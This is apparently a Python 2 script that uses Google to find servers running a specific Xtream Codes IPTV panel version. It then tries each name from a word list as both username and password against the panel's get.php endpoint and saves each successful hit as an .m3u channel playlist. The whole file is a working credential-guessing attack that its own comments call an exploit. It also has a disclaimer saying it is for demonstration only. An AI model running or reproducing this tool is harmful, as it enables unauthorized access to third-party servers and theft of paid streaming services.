import urllib2
import google
import time
import pyprind
import os
from urlparse import urlparse
from clint.textui import colored
from sys import argv as s
from itertools import (takewhile,repeat)

class Crawler(object):
    outputDir = "output"
    basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts"
    searchString = "Xtream Codes v1.0.59.5"

    """Default constructor
    Language
    """
    def __init__(self, language = "it"):
        self.language = language.lower()
        self.parsedUrls = list()

    """Search Links
    Print the first 30 links from a Google search
    We set the limit of 30 links because this script serve as demonstration and it's
    not intended to be use for personal purpose.

    The URLs will be printed on terminal screen without saving
    """
    def search_links(self):
        print colored.green("Fetching URLs plase wait...")
        # 30 results and stop at the first page
        for url in google.search(self.searchString, num=30, stop=1):
            parsed = urlparse(url)
            print parsed.scheme + "://" + parsed.netloc
        print colored.green("Done, 30 URLs founded")

    """Search Accounts
    This is the core method. It will crawl the give url for any possible accounts
    If we found any we will create a new directory under /output with the name
    of the site plus every account as five .m3u. Please use VLC for opening that
    kind of files
    """
    def search_accounts(self, url):
        try:
            fileName = "names/" + self.language + ".txt"
            fileLength = self.file_length(fileName)
            progressBar = pyprind.ProgBar(fileLength, title = "Fetching accunts on URL: " + url + " this might take a while.", stream = 1, monitor = True)
            foundedAccounts = 0
            with open(fileName) as f:
                rows = f.readlines()
            for row in rows:
                # Do the injection to the current url using the exploit that we know
                request = urllib2.Request(url + self.basicString % (row.rstrip().lstrip(), row.rstrip().lstrip()))
                response = urllib2.urlopen(request)
                fetched = response.read()
                # Update the progress bar in order to give to the user a nice
                # way to indicate the time left
                fileLength = fileLength - 1
                progressBar.update()
                # IF the fetched content is not empty
                # we build the dedicated .m3u file
                if len(fetched) > 0:
                    newPath = self.outputDir + "/" + url.replace("http://", "")
                    if os.path.exists(newPath) is False:
                        os.makedirs(newPath)
                    outputFile = open(str(newPath) + "/tv_channels_%s.m3u" % row.rstrip().lstrip(), "w")
                    outputFile.write(fetched)
                    foundedAccounts = foundedAccounts + 1
                    outputFile.close()
        except IOError:
            print colored.red("Cannot open the current Language file. Try another one")
        except urllib2.HTTPError, e:
            print colored.red("Ops, HTTPError exception here. Cannot fetch the current URL " + str(e.code))
        except urllib2.URLError, e:
            print colored.red("Ops, the URL seems broken." + str(e.reason))
        #except Exception:
        #    print colored.red("Damn an error occurred during the process")
        finally:
            if foundedAccounts != 0:
                print colored.green("Search done, account founded on " + url + ": " + str(foundedAccounts))
            else:
                print colored.red("No results for " + url)
    
    """File Length
    Cheapest way to calculate the rows of a file
    """
    def file_length(self, fileName):
        with open(fileName) as f:
            for i, l in enumerate(f):
                pass
        return i + 1
